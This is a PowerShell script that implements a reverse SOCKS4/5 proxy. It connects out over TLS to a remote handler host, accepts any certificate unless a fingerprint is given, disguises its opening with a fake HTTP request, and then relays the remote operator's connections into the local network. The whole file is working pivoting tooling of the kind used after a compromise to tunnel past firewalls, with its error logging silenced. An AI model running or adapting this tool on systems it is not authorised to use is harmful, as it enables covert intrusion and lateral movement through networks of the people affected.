# main block for socks connections
[ScriptBlock]$SocksConnectionMgr = {
    param( $vars )
    
    # copies the vars so they can be used in the runspace
    $Script = 
    {
            param( $vars )
            $vars.inStream.CopyTo($vars.outStream)
            Exit
    }

    $rsp = $vars.rsp

    # defines the get ip address function. this resolves ip address from domain name if needed
    function func_get_ipaddress 
    {
        param($socks_ip)
        if ($socks_ip -as [ipaddress])
        {
            return $socks_ip
        }
        else
        {
            $socks_ip2 = [System.Net.Dns]::GetHostAddresses($socks_ip)[0].IPAddressToString
        }
        return $socks_ip2
    }

    # gets the client and buffer from the vars
    $client = $vars.cliConnection
    $buffer_small = New-Object System.Byte[] 32


    try
    {
        # reads the buffer
        $cliStream = $vars.cliStream
        $cliStream.Read($buffer_small, 0, 2) | Out-Null

        # per protocol, the first byte is supposed to be the socks buffer
        $socksVer = $buffer_small[0]
        
        # if it is a socks5 proxy
        if ($socksVer -eq 5)
        {
            # performs socks5 protocol
            $cliStream.Read($buffer_small, 2, $buffer_small[1]) | Out-Null
            for ($ctr = 2; $ctr -le $buffer_small[1] + 1; $ctr++) 
            {
                if ($buffer_small[$ctr] -eq 0) {break}
            }
            if ($buffer_small[$ctr] -ne 0)
            {
                $buffer_small[1] = 255
                $cliStream.Write($buffer_small, 0, 2)
            }
            else
            {
                $buffer_small[1] = 0
                $cliStream.Write($buffer_small, 0, 2)
            }

            $cliStream.Read($buffer_small, 0, 4) | Out-Null
            $cmd = $buffer_small[1]
            $atyp = $buffer_small[3]

            if($cmd -ne 1)
            {
                $buffer_small[1] = 7
                $cliStream.Write($buffer_small, 0, 2)
                throw "Not a connect"
            }

            if($atyp -eq 1)
            {
                $socks_ipv4 = New-Object System.Byte[] 4
                $cliStream.Read($socks_ipv4, 0, 4) | Out-Null
                $socks_ipAddress = New-Object System.Net.IPAddress(,$socks_ipv4)
                $hostName = $socks_ipAddress.ToString()
            }
            elseif($atyp -eq 3)
            {
                $cliStream.Read($buffer_small, 4, 1) | Out-Null
                $hostBuff = New-Object System.Byte[] $buffer_small[4]
                $cliStream.Read($hostBuff, 0, $buffer_small[4]) | Out-Null
                $hostName = [System.Text.Encoding]::ASCII.GetString($hostBuff)
            }
            else
            {
                $buffer_small[1] = 8
                $cliStream.Write($buffer_small, 0, 2)
                throw "Not a valid destination address"
            }

            $cliStream.Read($buffer_small, 4, 2) | Out-Null
            $destPort = $buffer_small[4] * 256 + $buffer_small[5]
            $destHost = func_get_ipaddress($hostName)

            if($destHost -eq $null)
            {
                $buffer_small[1] = 4
                $cliStream.Write($buffer_small,0,2)
                throw "Cant resolve destination address"
            }

            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)

            if($tmpServ.Connected)
            {
                $buffer_small[1] = 0
                $buffer_small[3] = 1
                $buffer_small[4] = 0
                $buffer_small[5] = 0
                $cliStream.Write($buffer_small, 0, 10)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream() 
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyToAsync($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne()
                $AsyncJobResult2.AsyncWaitHandle.WaitOne()
                
            }
            else
            {
                $buffer_small[1] = 4
                $cliStream.Write($buffer_small, 0, 2)
                throw "Cant connect to host"
            }
       }
       elseif($socksVer -eq 4)
       {
            $cmd = $buffer_small[1]
            if($cmd -ne 1)
            {
                $buffer_small[0] = 0
                $buffer_small[1] = 91
                $cliStream.Write($buffer_small, 0, 2)
                throw "Not a connect"
            }
            $cliStream.Read($buffer_small, 2, 2) | Out-Null
            $destPort = $buffer_small[2] * 256 + $buffer_small[3]
            $socks_ipv4 = New-Object System.Byte[] 4
            $cliStream.Read($socks_ipv4, 0, 4) | Out-Null
            $destHost = New-Object System.Net.IPAddress(,$socks_ipv4)
            $buffer_small[0] = 1
            while ($buffer_small[0] -ne 0){
                $cliStream.Read($buffer_small, 0, 1)
            }
            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)
            
            if($tmpServ.Connected)
            {
                $buffer_small[0] = 0
                $buffer_small[1] = 90
                $buffer_small[2] = 0
                $buffer_small[3] = 0
                $cliStream.Write($buffer_small, 0, 8)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream() 
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyTo($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne()
                $AsyncJobResult2.AsyncWaitHandle.WaitOne()
            }
       }
       else
       {
            throw "Unknown socks version"
       }
    }
    catch {
        #$_ >> "error.log"
    }
    finally 
    {
        if ($client -ne $null) 
        {
            $client.Dispose()
        }
        if ($tmpServ -ne $null) 
        {
            $tmpServ.Dispose()
        }
        Exit;
    }
}

# reverse socks proxy function
function func_socks{

    # parameters that we'll want. this just requires that you give it the host that is handling reverse socks
    # connections and the port on which it is handling those connections
    param ( [String] $remote_host,
            [Int] $remote_port,
            [String] $cert_fingerprint = "",
            [Int] $threads = 200,
            [Int] $max_retries = 0 )

    # everything here is wrapped in a try block in case we error out
    try 
    {

        # initializes a try counter, current_try
        $current_try = 0

        # initializes a runspace pool, this is a powershell session that can run many threads at once
        $rsp = [runspacefactory]::CreateRunspacePool(1, $threads)
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30
        $rsp.open()

        # while we have not tried more than 5 times to connect to the remote host
        while($current_try -lt 5)
        {
            # verbose mode writes that we have connected successfully to the server
            Write-Host "Connecting to: " $remote_host ":" $remote_port

            # in another try block
            try
            {
                # creates a new tcp client for us to connect to
                $client = New-Object System.Net.Sockets.TcpClient($remote_host, $remote_port)
                $clear_clistream = $client.GetStream()
                
                if($cert_fingerprint -eq '')
                {
                    $cliStream = New-Object System.Net.Security.SslStream($clear_clistream, $false, ({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                else
                {
                    $cliStream = New-Object System.Net.Security.SslStream($clear_clistream, $false, ({return $args[1].GetCertHashString() -eq $cert_fingerprint } -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                
                # authenticates using TLSv1.2
                $cliStream.AuthenticateAsClient($remote_host, $null, [Net.SecurityProtocolType]::Tls12, $false)
                
                # verbose mode, writes connected at this point
                Write-Host "Connected"

                # the first thing this does is send a "fake" HTTP reqeuest over the connection, then whenever there is
                # something to be proxied, we'll get a Hello

                # every time we successfully connect, reset current try
                $current_try = 0

                # initializes buffers for the hello and buffers for the fake request
                # buffer_small will be used for our proxy connections, while buffer_large will be used for our initial connection
                $buffer_small = New-Object System.Byte[] 32
                $buffer_large = New-Object System.Byte[] 122

                # establishes the fake request
                $est_request = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: " + $remote_host + "`n`n")
                # writes the establishment reqeuest to the buffer
                $cliStream.Write($est_request, 0, $est_request.Length)
                
                # sets the read timeout and attempts to read the establishment request into the larger buffer
                $cliStream.ReadTimeout = 1000
                $cliStream.Read($buffer_large, 0, 122) | Out-Null
                
                # reads the message after
                $cliStream.Read($buffer_small, 0, 5) | Out-Null
                
                # converst the small buffer message to text
                $message = [System.Text.Encoding]::ASCII.GetString($buffer_small)
                
                # verbose mode writes the message to the terminal
                Write-Host $message

                # handle whether or not the hello message was sent back successfully
                if($message -ne "HELLO")
                {
                    throw "No Client connected"
                }
                else
                {
                    Write-Host "Connection received"
                }


                $cliStream.ReadTimeout = 100000

                # initializes a powershell runspace to handle the socks connection after it's established
                $vars = [PSCustomObject]@{"cliConnection" = $client ; "rsp" = $rsp ; "cliStream" = $cliStream }
                $PS3 = [PowerShell]::Create()
                $PS3.RunspacePool = $rsp;
                $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
                $PS3.BeginInvoke() | Out-Null

            }
            catch
            {
                $current_try = $current_try + 1;
                # if (($max_retries -ne 0) -and ($current_try -eq $max_retries)){
                #     Throw "Cannot connect to handler, max Number of attempts reached, exiting";
                # }
                # if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "The remote certificate is invalid according to the validation procedure."')
                # {
                #     throw $_
                # }
                # if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "Authentication failed because the remote party has closed the transport stream."')
                # {
                #     sleep 5
                # }

                # if (($_.Exception.Message.Length -ge 121) -and $_.Exception.Message.substring(0,120) -eq 'Exception calling ".ctor" with "2" argument(s): "No connection could be made because the target machine actively refused')
                # {
                #     sleep 5
                # }
                try
                {
                    $client.Close()
                    $client.Dispose()
                }
                catch{}
                    sleep -Milliseconds 1
            }
        }
    }
    catch
    {
        throw $_;
    }
    finally
    {
        # when we're done, writes that the server is closed
        write-host "Server closed."

        # cleans up everything
        if ($client -ne $null) 
        {
            $client.Dispose()
            $client = $null
        }
        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) 
        {
            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}
